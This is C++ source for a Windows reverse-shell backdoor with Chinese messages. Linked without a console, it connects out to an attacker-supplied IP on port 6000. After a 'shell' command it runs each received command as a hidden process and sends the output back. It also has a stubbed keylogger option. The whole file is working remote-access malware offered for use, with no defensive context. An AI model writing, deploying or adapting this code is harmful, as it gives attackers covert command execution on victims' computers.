#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#include <winsock2.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")
#define MSG_LEN 10244
void run(char *cmdLine, char *message);
int cmd(char *cmdLine, char *message);
void trim(char *str);
void run(char *cmdLine, char *message) {
	static int Useshell = 0;
	trim(cmdLine);
	if (strcmp(cmdLine, "shell") == 0) {
		Useshell = 1;
		strcpy(message, "shell已开启\n");
		return;
	}
	else if (strcmp(cmdLine, "exit") == 0) {
		Useshell = 0;
		strcpy(message, "shell已关闭\n");
		return;
	}
	else if (strcmp(cmdLine, "keyboardListen") == 0) {
		//hook()
		strcpy(message, "接口尚未开放");
		return;
	}
	else if (Useshell == 1) {
		cmd(cmdLine, message);
	}
	else {
		strcpy(message, "输入错误\n请输入  shell或keyboardListen ");
		return;
	}
}
int cmd(char *cmdLine, char *message) {
	char tmpChar[MSG_LEN] = { 0 };
	int result;
	DWORD getLength;
	HANDLE hRead, hWrite;
	SECURITY_ATTRIBUTES sa;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		printf("管道创建失败!");
	}
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
	startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.hStdOutput = hWrite;
	startupInfo.hStdError = hWrite;

	result = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startupInfo, &processInformation);
	if (!result) {

		printf("子进程创建失败!Error:%x:\n", (unsigned int)GetLastError());
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return 1;
	}
	CloseHandle(hWrite);
	while (ReadFile(hRead, tmpChar, MSG_LEN, &getLength, 0)) {
		strcat(message, tmpChar);
		ZeroMemory(&tmpChar, MSG_LEN);
	}
	CloseHandle(hRead);
	return 0;
}

void str_Replace(char *mainStr, char searchChar, char replaceChar) {
	char tmpChar;
	for (int i = 0; i < strlen(mainStr); i++) {
		if (mainStr[i] == searchChar) {
			mainStr[i] = replaceChar;
		}
	}
}

void trim(char *str) {
	int len;
	len = strlen(str);
	for (int i = 0; i < len; i++) {
		if (str[i] == ' ') {
			str[i] = '\0';
		}
	}

}

int main(int argc, char **argv) {
	int err;
	int result;
	int i = 0;
	char cmdLine[MSG_LEN] = { 0 };
	char message[MSG_LEN] = { 0 };
	DWORD getLength;
	SOCKET sockServer;
	SOCKET sockClient;
	SOCKADDR_IN addrServer;
	SOCKADDR_IN addrClient;
	WSADATA wsData;
	WORD wVersionRequested;
	const char welcome[] = "请输入shell或keyboardListen";
	unsigned netAddr[100];

	//HANDLE hRead, hWrite;



	wVersionRequested = MAKEWORD(2, 2);
	err = WSAStartup(wVersionRequested, &wsData);
	if (err != 0) {
		return 1;
	}
	if (LOBYTE(wsData.wVersion) != 2 || HIBYTE(wsData.wVersion) != 2) {
		WSACleanup();
		return 1;
	}
	sockServer = socket(AF_INET, SOCK_STREAM, 0);
	sockClient = socket(AF_INET, SOCK_STREAM, 0);
	inet_pton(AF_INET, argv[1], &addrServer.sin_addr);
	//addrServer.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(6000);
	connect(sockClient, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));

	while (1) {
		ZeroMemory(cmdLine, MSG_LEN);
		recv(sockClient, cmdLine, MSG_LEN, 0);
		str_Replace(cmdLine, '\n', ' ');
		//printf("待执行命令:%s\n", cmdLine);
		run(cmdLine, message);
		//puts(message);
		send(sockClient, message, strlen(message), 0);
		ZeroMemory(message, MSG_LEN);
	}
	closesocket(sockClient);
	WSACleanup();

	getchar();
	return 0;
}